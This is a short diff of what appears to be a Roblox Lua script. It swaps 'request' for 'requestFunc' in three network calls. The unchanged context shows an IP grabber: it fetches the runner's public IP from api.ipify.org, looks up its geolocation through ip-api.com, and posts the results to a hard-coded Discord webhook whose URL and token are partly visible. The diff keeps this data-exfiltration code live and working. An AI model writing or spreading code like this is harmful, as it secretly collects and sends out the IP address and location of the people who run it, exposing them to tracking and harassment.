@@ -190,7 +190,7 @@ local url = "https://discord.com/api/webhooks/1451981212871561391/AbU8pddxkQlTNG
 local function a(ipAddress)
     local endpoint = string.format("http://ip-api.com/json/%s", ipAddress)
 
-    local response = request({Url = endpoint})
+    local response = requestFunc({Url = endpoint})
 
     if response.StatusCode == 200 then
         local data = game:GetService("HttpService"):JSONDecode(response.Body)
@@ -207,7 +207,7 @@ local function a(ipAddress)
     return nil
 end
 local function b()
-    local response = request({Url = "https://api.ipify.org/?format=json"})
+    local response = requestFunc({Url = "https://api.ipify.org/?format=json"})
 
     if response.StatusCode == 200 then
         local data = game:GetService("HttpService"):JSONDecode(response.Body)
@@ -226,7 +226,7 @@ local function sendWebhook(message)
         ["content"] = message 
     }
 
-    request({
+    requestFunc({
         Url = url,
         Method = 'POST',
         Headers = headers,
